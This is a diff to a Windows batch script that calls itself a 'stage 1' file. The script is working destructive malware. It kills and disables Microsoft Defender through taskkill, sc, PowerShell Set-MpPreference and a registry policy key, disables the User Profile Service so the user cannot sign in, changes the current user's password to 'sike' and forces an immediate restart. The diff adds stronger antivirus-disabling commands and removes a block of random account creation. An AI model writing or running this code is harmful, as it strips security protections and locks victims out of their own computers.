@@ -1,7 +1,10 @@
 @echo off
 
+REM This is the stage 1 batch file
+REM It expects to be executed from a user
 REM This batch script expects to have Administartive Privleges
 REM If not it won't work
+
 cd %temp%
 md 0b8ae314-21b1-435e-ab26-260846fa9020
 cd 0b8ae314-21b1-435e-ab26-260846fa9020
@@ -9,7 +12,10 @@ cd 0b8ae314-21b1-435e-ab26-260846fa9020
 REM Try to disable MS Defender
 taskkill /f /im MsMpEng.exe
 sc config "WinDefend" start= disabled
+sc stop "WinDefend"
 sc config "wscsvc" start= disabled
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 
 
 REM Disable the User Profile Service so the user cant sign in
@@ -46,26 +52,5 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Disa
 
 REM Changing the password of the current user and messing with the user list
 net user %USERNAME% sike
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
-net user /add %RANDOM%
 
 shutdown -r -t 0
